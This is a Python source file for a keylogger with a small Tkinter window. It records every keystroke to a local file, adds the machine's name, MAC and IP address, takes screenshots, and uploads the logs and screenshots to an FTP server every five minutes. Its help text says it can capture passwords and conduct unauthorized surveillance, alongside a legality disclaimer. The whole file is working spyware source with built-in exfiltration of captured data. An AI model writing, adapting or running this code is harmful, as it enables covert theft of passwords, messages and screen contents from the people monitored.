import pynput.keyboard as keyboard
import pyautogui
import time
from PIL import Image
from datetime import datetime, timedelta
import threading
import ftplib
import os
import platform
import socket
import uuid
import tkinter as tk
import tkinter.messagebox as messagebox

class SystemInfo:
    def __init__(self):
        # Get the computer information
        self.system_info = platform.uname()

        # Get the MAC address
        self.mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                                     for i in range(0, 8 * 6, 8)][::-1])

        # Get the IP address
        self.ip_address = socket.gethostbyname(socket.gethostname())

    def get_info(self):
        # Get the current date and time
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")

        # Create a string with the computer information, MAC address, IP address, and date/time stamp
        computer_info = f"Date/Time: {date_time}\nSystem: {self.system_info.system}" \
                        f"\nNode Name: {self.system_info.node}" \
                        f"\nRelease: {self.system_info.release}" \
                        f"\nVersion: {self.system_info.version}" \
                        f"\nMachine: {self.system_info.machine}" \
                        f"\nProcessor: {self.system_info.processor}" \
                        f"\nMAC Address: {self.mac_address}\nIP Address: {self.ip_address}\n"
        return computer_info


class KeyLogger:
    def __init__(self):
        self.log = ""
        self.caps = False
        self.count = 0

        # Set a flag to check if the computer information and timestamp have been added to the log
        self.info_added = False
        self.system_info = SystemInfo()

    def on_press(self, key):
        try:
            char = key.char
            if char == '\n':
                # If the key pressed is the enter key, add a new line without a timestamp
                self.log += f"{char}"
            else:
                # If the key pressed is not the enter key, add the character to the log
                self.log += f"{char}"
        except AttributeError:
            if key == keyboard.Key.space:
                # If the key pressed is the space key, add a space without a timestamp
                self.log += " "
            elif key == keyboard.Key.shift or key == keyboard.Key.caps_lock:
                # If the key pressed is the shift key or caps lock, update the 'caps' flag and do not add anything to the log
                self.caps = not self.caps
                pass
            elif key == keyboard.Key.backspace:
                pass

            elif key == keyboard.Key.enter:
                # If the key pressed is the enter key, add a new line without a timestamp
                self.log += "\n"
            else:
                # If the key pressed is not a special key, add the key to the log
                self.log += f"{str(key)}"

        # Write the log to the file
        filename = f"keyfile.txt"
        with open(filename, 'a') as logKey:
            # If the computer information and timestamp have not been added to the log yet, add them to the beginning of the file
            if not self.info_added:
                logKey.write(f"{self.system_info.get_info()}\n")
                self.info_added = True
            logKey.write(self.log)

        print(self.log)

        # Reset the log variable after writing to the file
        self.log = ""

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


class FileUploader:
    def __init__(self):
        self.server_address = ""  # Replace this with the address of your server
        self.username = ""
        self.password = ""  # Replace this with your FTP password
        self.directory = "logs"  # Replace this with the directory on your FTP server where you want to upload the logs

    def upload_file(self, filename):
        # Create an FTP connection and log in
        ftp = ftplib.FTP(self.server_address)
        ftp.login(user=self.username, passwd=self.password)

        # Change to the logs directory on the server
        ftp.cwd(self.directory)

        # Open the local file and upload it to the server
        with open(filename, 'rb') as file:
            ftp.storbinary(f"STOR {filename}", file)

        # Close the FTP connection
        ftp.quit()

    def upload_image(self, filename):
        # Create an FTP connection and log in
        ftp = ftplib.FTP(self.server_address)
        ftp.login(user=self.username, passwd=self.password)

        # Change to the logs directory on the server
        ftp.cwd(self.directory)

        # Open the local file and upload it to the server
        with open(filename, 'rb') as file:
            ftp.storbinary(f"STOR {filename}", file)

        # Close the FTP connection
        ftp.quit()


def show_help():
    help_text = "This is a corporate keylogger that records user keystrokes with your knowledge" \
                "It can be used for various purposes, including monitoring user activity, " \
                "capturing sensitive information such as passwords, or conducting unauthorized surveillance. " \
                "Please note that using keyloggers without proper authorization is illegal and unethical. " \
                "Make sure to use keyloggers responsibly and in compliance with applicable laws and regulations."
    messagebox.showinfo("Keylogger Help", help_text)


def upload_logs():
    update_status_bar("Uploading logs...")
    # Take a screenshot and save it to a file
    now = datetime.now()
    screenshot_name = f"screenshot_{now.strftime('%Y-%m-%d_%H-%M-%S')}.png"
    pyautogui.screenshot(screenshot_name)

    # Upload the screenshot to the FTP server
    file_uploader = FileUploader()
    file_uploader.upload_image(screenshot_name)

    # Upload the log file to the FTP server
    log_file_name = "keyfile.txt"
    file_uploader.upload_file(log_file_name)

    update_status_bar("Logs uploaded successfully")


def schedule_upload():
    # Call the upload_logs function
    upload_logs()

    # Schedule the next upload in 5 minutes
    threading.Timer(300, schedule_upload).start()


if __name__ == "__main__":
    # Create the main window
    window = tk.Tk()
    window.title("Keylogger")
    window.geometry("400x300")

    # Create a label to display the boot time
    boot_time_label = tk.Label(window, text="Boot Time: " + datetime.now().strftime("%m/%d/%Y, %H:%M:%S"))
    boot_time_label.pack()

    # Create a label to display the running time of the keylogger
    running_time_label = tk.Label(window, text="Running Time: 00:00:00")
    running_time_label.pack()

    def update_running_time():
        running_time = datetime.now() - start_time
        running_time_label.config(text="Running Time: " + str(running_time))
        running_time_label.after(1000, update_running_time)

    start_time = datetime.now()
    update_running_time()

    # Create a status bar label
    status_bar_label = tk.Label(window, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
    status_bar_label.pack(side=tk.BOTTOM, fill=tk.X)

    def update_status_bar(message):
        status_bar_label.config(text=message)
        status_bar_label.update_idletasks()

    # Create a button to manually upload the logs
    upload_button = tk.Button(window, text="Upload Logs", command=upload_logs)
    upload_button.pack()

    # Create a menu bar
    menu_bar = tk.Menu(window)
    window.config(menu=menu_bar)

    # Create a "Help" menu
    help_menu = tk.Menu(menu_bar, tearoff=False)
    menu_bar.add_cascade(label="Help", menu=help_menu)
    help_menu.add_command(label="About", command=show_help)

    # Start the keylogger in a separate thread
    keylogger = KeyLogger()
    threading.Thread(target=keylogger.start_logging).start()

    # Schedule the automatic upload of logs every 5 minutes
    schedule_upload()

    # Start the main event loop
    window.mainloop()
